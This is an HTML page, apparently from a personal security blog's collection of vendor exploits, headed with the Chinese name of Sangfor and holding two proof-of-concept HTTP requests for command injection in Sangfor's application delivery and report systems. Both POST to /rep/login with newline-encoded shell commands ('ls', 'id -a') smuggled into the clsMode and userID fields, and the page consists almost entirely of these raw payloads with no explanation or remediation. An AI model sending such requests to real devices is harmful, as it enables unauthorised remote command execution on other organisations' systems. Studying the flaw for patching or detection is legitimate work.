@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>深信服 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6df1\u4fe1\u670d", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_2" },
+              {title: "\u5e94\u7528\u4ea4\u4ed8", url: "#_3" },
+              {title: "\u6df1\u4fe1\u670d\u62a5\u8868", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F/" class="btn btn-xs btn-link">
+        绿盟
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/" class="btn btn-xs btn-link">
+        海康威视
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">深信服</h1>
+<h2 id="_2">目录</h2>
+<ul>
+<li><a href="#应用交付">应用交付</a><ul>
+<li><a href="#深信服应用交付系统命令执行漏洞-POC">深信服应用交付系统命令执行漏洞 POC</a></li>
+</ul>
+</li>
+<li><a href="#深信服报表">深信服报表</a><ul>
+<li><a href="#深信服-sxf-报表系统-版本有限制">深信服 sxf-报表系统 版本有限制</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="_3">应用交付</h2>
+<h3 id="poc">深信服应用交付系统命令执行漏洞 POC</h3>
+<p>POST /rep/login</p>
+<p>Host:10.10.10.1:85</p>
+<p>clsMode=cls_mode_login%0Als%0A\&amp;index=index\&amp;log_type=report\&amp;loginType=account\&amp;page=login\&amp;rnd=0\&amp;userID=admin\&amp;userPsw=123</p>
+<h2 id="_4">深信服报表</h2>
+<h3 id="sxf-">深信服 sxf-报表系统 版本有限制</h3>
+<p>POC</p>
+<pre><code class="language-纯文本">POST /rep/login HTTP/1.1
+
+Host: URL
+
+Cookie:
+
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0
+
+Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif, image/webp,*/*;q=0.8 Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2
+
+Accept-Encoding: gzip deflate
+
+Upgrade-Insecure-Requests: 1
+
+Sec-Fetch-Dest: document
+
+Sec-Fetch-Mode: navigate
+
+Sec-Fetch-Site: cross-site Pragma: no-cache Cache-Control: no-cache14 Te: trailers
+
+Connection: close
+
+Content-Type:application/x-www-form-urlencoded
+
+Content-Length: 126 clsMode=cls_mode_login&amp;index=index&amp;log_type=report&amp;page=login&amp;rnd=0.7550103466497915&amp;userID=admin%0Aid -a %0A&amp;userPsw=tmbhuisq
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F/" class="btn btn-xs btn-link">
+        绿盟
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/" class="btn btn-xs btn-link">
+        海康威视
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
